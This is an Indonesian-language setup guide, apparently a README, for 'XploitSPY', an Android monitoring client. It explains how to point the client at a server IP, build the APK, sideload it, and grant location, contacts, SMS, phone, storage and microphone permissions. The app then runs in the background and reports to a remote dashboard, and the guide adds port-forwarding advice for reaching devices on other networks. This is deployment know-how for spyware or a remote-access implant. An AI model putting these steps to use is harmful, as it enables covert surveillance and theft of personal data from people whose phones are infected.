# Setup Android Client untuk Monitoring

## Kenapa Dashboard Kosong?

Dashboard menampilkan "Tidak ada perangkat yang terhubung" karena:
- Belum ada Android client yang terinstall di device
- Android client belum dikonfigurasi dengan IP server
- Android client belum terhubung ke server

## Cara Setup Android Client

### Step 1: Dapatkan IP Server

```bash
# Di Mac/Linux
ifconfig | grep "inet " | grep -v 127.0.0.1

# Atau
ipconfig getifaddr en0
```

**Catatan IP server Anda** (contoh: `192.168.1.100`)

### Step 2: Konfigurasi Android Client

#### Opsi A: Menggunakan APK Builder (Recommended)

```bash
cd builder
./build.sh
```

Masukkan:
- Server IP: `YOUR_SERVER_IP` (contoh: 192.168.1.100)
- Server Port: `3000` (atau 80 jika menggunakan port 80)

Script akan otomatis mengupdate file `Config.java`

#### Opsi B: Manual Configuration

Edit file `client/app/src/main/java/com/xploitspy/client/Config.java`:

```java
public class Config {
    // Ganti YOUR_SERVER_IP dengan IP server Anda
    public static final String SERVER_URL = "http://192.168.1.100:3000";
    public static final String SOCKET_URL = "http://192.168.1.100:3000";
    // ...
}
```

### Step 3: Build APK

#### Menggunakan Android Studio (Recommended)

1. Buka Android Studio
2. Open project: pilih folder `client/`
3. Tunggu Gradle sync selesai
4. Build → Build Bundle(s) / APK(s) → Build APK(s)
5. APK akan tersedia di `app/build/outputs/apk/release/`

#### Menggunakan Command Line

```bash
cd client

# Build APK
./gradlew assembleRelease

# APK akan tersedia di:
# app/build/outputs/apk/release/app-release.apk
```

**Catatan:** Pastikan Android SDK sudah terinstall dan `ANDROID_HOME` sudah di-set.

### Step 4: Install APK di Android Device

1. Transfer APK ke Android device (via USB, email, atau cloud storage)
2. Di Android device, buka Settings → Security
3. Aktifkan "Install from Unknown Sources" atau "Allow from this source"
4. Buka file APK dan install
5. Berikan semua permissions yang diminta:
   - Location
   - Contacts
   - SMS
   - Phone
   - Storage
   - Microphone
   - dll

### Step 5: Verifikasi Koneksi

1. Setelah install, aplikasi akan otomatis berjalan di background
2. Buka dashboard di browser: `http://YOUR_SERVER_IP:3000`
3. Refresh halaman dashboard
4. Device seharusnya muncul di daftar "Connected Devices"

## Troubleshooting

### Device tidak muncul di dashboard

1. **Cek koneksi internet device:**
   - Pastikan device dan server dalam jaringan WiFi yang sama
   - Atau device bisa akses IP server (jika berbeda network)

2. **Cek IP server di Config.java:**
   - Pastikan IP benar (bukan localhost/127.0.0.1)
   - Pastikan port benar (3000 atau 80)

3. **Cek server logs:**
   ```bash
   cd server
   npm run pm2:logs
   ```
   Lihat apakah ada koneksi dari device

4. **Cek firewall:**
   - Pastikan firewall server mengizinkan port 3000 (atau 80)
   - Pastikan router tidak memblokir koneksi

5. **Test koneksi dari device:**
   - Buka browser di Android device
   - Akses: `http://YOUR_SERVER_IP:3000`
   - Harus bisa akses dashboard

### Data tidak muncul

1. **Cek permissions:**
   - Pastikan semua permissions sudah diberikan
   - Buka Settings → Apps → XploitSPY → Permissions
   - Aktifkan semua permissions

2. **Restart aplikasi:**
   - Force stop aplikasi
   - Buka lagi aplikasi

3. **Cek logs Android:**
   ```bash
   adb logcat | grep XploitSPY
   ```

### Build APK Error

1. **Android SDK tidak ditemukan:**
   ```bash
   export ANDROID_HOME=$HOME/Android/Sdk
   export PATH=$PATH:$ANDROID_HOME/tools
   export PATH=$PATH:$ANDROID_HOME/platform-tools
   ```

2. **Gradle error:**
   ```bash
   cd client
   ./gradlew clean
   ./gradlew assembleRelease
   ```

## Quick Setup Script

Saya sudah membuat script untuk memudahkan setup. Lihat di `builder/build.sh`

## Catatan Penting

1. **IP Server harus accessible dari Android device:**
   - Jika server di localhost, device tidak bisa connect
   - Gunakan IP lokal (192.168.x.x) jika dalam jaringan yang sama
   - Atau gunakan IP publik jika berbeda network

2. **Port harus terbuka:**
   - Pastikan port 3000 (atau 80) tidak di-block firewall
   - Jika menggunakan router, mungkin perlu port forwarding

3. **HTTPS untuk Production:**
   - Untuk production, gunakan HTTPS (WSS untuk WebSocket)
   - Update Config.java dengan URL HTTPS

## Testing Tanpa Android Device

Untuk testing, Anda bisa menggunakan Android Emulator:

1. Install Android Studio
2. Buat Android Virtual Device (AVD)
3. Install APK di emulator
4. Pastikan emulator bisa akses IP server

